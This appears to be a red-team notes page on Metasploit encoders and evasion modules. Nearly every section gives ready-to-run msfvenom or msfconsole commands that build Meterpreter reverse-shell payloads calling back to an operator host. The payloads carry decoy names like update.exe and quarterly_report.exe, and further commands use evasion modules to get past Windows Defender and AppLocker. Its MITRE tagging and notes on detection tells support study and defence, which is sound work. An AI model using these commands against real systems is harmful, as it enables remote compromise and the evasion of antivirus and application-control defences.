# Metasploit — Encoders and Evasion — Hands-On Use Cases

## Contents
- [Enumerating Available Encoders](#enumerating-available-encoders)
- [Baseline shikata_ga_nai Encoding](#baseline-shikata_ga_nai-encoding)
- [Iterative Re-Encoding and Why It Doesn't Help](#iterative-re-encoding-and-why-it-doesnt-help)
- [Alphanumeric Encoding for Printable-Only Injection Contexts](#alphanumeric-encoding-for-printable-only-injection-contexts)
- [Context-Keyed Encoding to Complicate Static Emulation](#context-keyed-encoding-to-complicate-static-emulation)
- [x64 Payload Encoding](#x64-payload-encoding)
- [Chained Multi-Encoder Pipeline](#chained-multi-encoder-pipeline)
- [Loading an Encoder Directly Inside msfconsole](#loading-an-encoder-directly-inside-msfconsole)
- [Bad-Character-Driven Encoder Auto-Selection](#bad-character-driven-encoder-auto-selection)
- [Evasion Module — Generating an Evasive Windows Executable (Brief Coverage)](#evasion-module--generating-an-evasive-windows-executable-brief-coverage)
- [Evasion Module — AppLocker Bypass via Signed-Binary Proxy Execution (Brief Coverage)](#evasion-module--applocker-bypass-via-signed-binary-proxy-execution-brief-coverage)

---

## Enumerating Available Encoders

**MITRE ATT&CK:** T1587.001 (Develop Capabilities: Malware) — reconnaissance against the operator's own toolkit, not an action against a target.

```bash
msfvenom -l encoders
```
```
msf6 > search type:encoder
msf6 > info encoder/x86/shikata_ga_nai
```
`msfvenom -l encoders` prints the live, version-accurate table (name, rank, description) directly from the running Framework install — the authoritative source over any static cheat sheet, including the [Verified Encoder Inventory](01%20-%20Overview.md#verified-encoder-inventory) table in `01 - Overview.md`. `info` on a specific module (from either `msfconsole` or `msfvenom --list-options -p <payload> -e <encoder>`) shows the encoder's own advanced options, useful before relying on a less common encoder's non-default behavior.

## Baseline shikata_ga_nai Encoding

**MITRE ATT&CK:** T1027 (Obfuscated Files or Information).

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 \
  -e x86/shikata_ga_nai -f exe -o update.exe
```
Note the encoder is `x86/shikata_ga_nai` even against an `x64` payload architecture in some Framework versions/wrapping contexts — msfvenom will reject an incompatible arch/encoder pairing outright at generation time, so a successful run confirms compatibility rather than requiring the operator to memorize which encoders support which architectures. This is the "default, most commonly seen" configuration flagged in `../msfvenom/04 - Target Evidence.md`'s Static and Behavioral AV/EDR Signature Notes — precisely because it's the default, it's also the most heavily signatured shape by mainstream AV/EDR, both at the raw-payload layer and, per this folder's `01 - Overview.md`, at the **decoder-stub layer itself**.

## Iterative Re-Encoding and Why It Doesn't Help

**MITRE ATT&CK:** T1027.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 \
  -e x86/shikata_ga_nai -i 10 -f exe -o update.exe
```
`-i 10` runs the encoder ten times, layering ten decoder stubs. This grows the output file and adds decode latency on the target at execution time, but does **not** meaningfully change the detection posture — each layer is still a `shikata_ga_nai`-shaped stub, and modern static engines that signature the stub pattern once will match it whether it appears once or ten times. Presenting a high `-i` value as a real evasion lever in a write-up or an engagement report is a factual error; the honest framing is "makes the file bigger and slower to start," not "harder to detect."

## Alphanumeric Encoding for Printable-Only Injection Contexts

**MITRE ATT&CK:** T1027, T1140 (Deobfuscate/Decode Files or Information — the target-side decode step).

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 \
  -e x86/alpha_mixed -f raw BufferRegister=EAX
```
`x86/alpha_mixed` (SkyLined's Alpha2 encoder) is not chosen for AV evasion — it's chosen when the delivery path itself only tolerates printable alphanumeric bytes: a URL parameter, a form field with character-class validation, certain buffer-overflow injection points. Per the encoder's own documentation, a *pure* alpha encoder is structurally impossible without a register pointing at or near the shellcode at execution time, so `BufferRegister` typically has to be set explicitly to the register that will hold that pointer in the specific injection context — leaving it unset produces a non-alphanumeric `fnstenv`-based GetPC stub at the front (matching `shikata_ga_nai`'s own stub shape) before the alphanumeric body.

## Context-Keyed Encoding to Complicate Static Emulation

**MITRE ATT&CK:** T1027, T1140.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 \
  -e x86/context_time -f exe -o timed.exe
```
`x86/context_cpuid`, `x86/context_stat`, and `x86/context_time` derive part of the decode key from a runtime value (`cpuid` output, a `stat()` syscall result, the current time) rather than a value baked into the stub itself. The operational intent is to complicate **automated static emulation/sandboxing** specifically — an emulator that doesn't faithfully reproduce the queried runtime value can't correctly derive the decode key and may fail to unpack the payload for further static analysis. This is a narrower, more specific claim than "evades AV" — it targets the emulation/sandbox stage of a detection pipeline, not signature matching or behavioral EDR.

## x64 Payload Encoding

**MITRE ATT&CK:** T1027.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 \
  -e x64/zutto_dekiru -f exe -o update64.exe
```
The x64 encoder set (`x64/zutto_dekiru`, `x64/xor_dynamic`, `x64/xor_context`) is smaller than the x86 set — 64-bit shellcode has historically had fewer positional/bad-character constraints driving encoder proliferation. `x64/zutto_dekiru` is the closest 64-bit analogue to `shikata_ga_nai` in spirit; confirm its exact current rank via `msfvenom -l encoders` per the caveat in `01 - Overview.md`'s inventory table before citing it as a specific numeric/qualitative rank in a report.

## Chained Multi-Encoder Pipeline

**MITRE ATT&CK:** T1027.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 3 | \
msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 2 -f raw | \
msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe
```
This is the same piping mechanic covered from the msfvenom-CLI angle in `../msfvenom/02 - Hands-On Use Cases.md`'s "Chaining Multiple Encoders via Piped Invocations," revisited here for the encoder-selection reasoning: an operator alternates encoder families (here, `shikata_ga_nai`'s additive-feedback engine and `call4_dword_xor`'s simpler GetPC-based engine) on the theory that a static signature tuned to one decoder-stub shape won't match a differently-shaped stub layered on top. The **file-structure tell stays the same regardless** — this doesn't change the fundamental entropy/injection signature described in `../msfvenom/01 - Overview.md`'s red-flag callout, only the specific stub bytes at the front of the encoded blob.

## Loading an Encoder Directly Inside msfconsole

**MITRE ATT&CK:** T1027.

```
msf6 > use encoder/x86/shikata_ga_nai
msf6 encoder(x86/shikata_ga_nai) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 encoder(x86/shikata_ga_nai) > set LHOST 10.10.14.1
msf6 encoder(x86/shikata_ga_nai) > set LPORT 4444
msf6 encoder(x86/shikata_ga_nai) > generate -f exe -o update.exe
```
Functionally identical output to the equivalent `msfvenom -e` invocation — this is the msfconsole-native path, useful when an operator is already deep in an interactive console session (workspace loaded, other modules staged) and doesn't want to shell out. Baseline `use`/`set`/`run` module mechanics are covered generically in `../msfconsole/02 - Hands-On Use Cases.md`'s "Baseline Module Workflow," not re-derived here — `generate` is the encoder-module-specific command that replaces a generic `run`/`exploit`.

## Bad-Character-Driven Encoder Auto-Selection

**MITRE ATT&CK:** T1587.001 (exploit-development tooling, not obfuscation of a deliverable — no T1027 tag, consistent with `../msfvenom/02 - Hands-On Use Cases.md`'s tagging of the same scenario).

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 \
  -b '\x00\x0a\x0d' -f c
```
Supplying `-b` without an explicit `-e` lets msfvenom pick whichever encoder satisfies the bad-character constraint — this is the encoder-selection-mechanics half of the same flag covered from the msfvenom-flags angle in `../msfvenom/01 - Overview.md`. In practice this is almost always an exploit-development concern (certain bytes terminate a string, break a parser, or can't survive a specific injection path) rather than an AV-evasion choice.

## Evasion Module — Generating an Evasive Windows Executable (Brief Coverage)

**MITRE ATT&CK:** T1027, T1497 (Virtualization/Sandbox Evasion — the anti-emulation component specifically).

> Kept intentionally brief per this folder's stated scope (see `01 - Overview.md`) — one illustrative worked example, not a deep per-module dive. Extend this section first in the follow-up pass.

```
msf6 > use evasion/windows/windows_defender_exe
msf6 evasion(windows/windows_defender_exe) > set PAYLOAD windows/meterpreter/reverse_https
msf6 evasion(windows/windows_defender_exe) > set LHOST 10.10.14.1
msf6 evasion(windows/windows_defender_exe) > set LPORT 443
msf6 evasion(windows/windows_defender_exe) > set FILENAME quarterly_report.exe
msf6 evasion(windows/windows_defender_exe) > exploit
```
Per the module's own documentation, this RC4-encrypts the embedded shellcode specifically to defeat static scanning, compiles through a non-default custom compiler chain, and includes an anti-emulation check. `reverse_https` is used here rather than plain `reverse_tcp` deliberately — the module's own guidance recommends an encrypted transport (RC4 or HTTPS-capable Meterpreter) so the evasion effort on disk isn't undermined by a plaintext callback that's trivially signatured at the network layer. Output lands in `~/.msf4/local/quarterly_report.exe` by default (confirmed via this pass's research — see `01 - Overview.md`'s How It Works diagram), not on the target; delivery is a separate step, same as every msfvenom-generated payload.

## Evasion Module — AppLocker Bypass via Signed-Binary Proxy Execution (Brief Coverage)

**MITRE ATT&CK:** T1218.009 (System Binary Proxy Execution: Regsvcs/Regasm), T1027.

> Kept intentionally brief per this folder's stated scope — one illustrative command, no deep internals. Extend this section first in the follow-up pass.

```
msf6 > use evasion/windows/applocker_evasion_regasm_regsvcs
msf6 evasion(windows/applocker_evasion_regasm_regsvcs) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 evasion(windows/applocker_evasion_regasm_regsvcs) > set LHOST 10.10.14.1
msf6 evasion(windows/applocker_evasion_regasm_regsvcs) > set LPORT 4444
msf6 evasion(windows/applocker_evasion_regasm_regsvcs) > exploit
```
Structurally different from `windows_defender_exe` above — this module isn't obfuscating a payload's bytes at all, it's generating output meant to be launched **through** a Microsoft-signed binary (`RegAsm.exe`/`RegSvcs.exe`) that default AppLocker/software-restriction-policy rule sets typically permit. The four sibling modules (`applocker_evasion_install_util`, `applocker_evasion_msbuild`, `applocker_evasion_presentationhost`, `applocker_evasion_workflow_compiler`) follow the same "proxy through a different signed binary" pattern with a different LOLBin each — see `../../LOLBins/` (once built) for the general signed-binary-abuse pattern this technique class relies on.
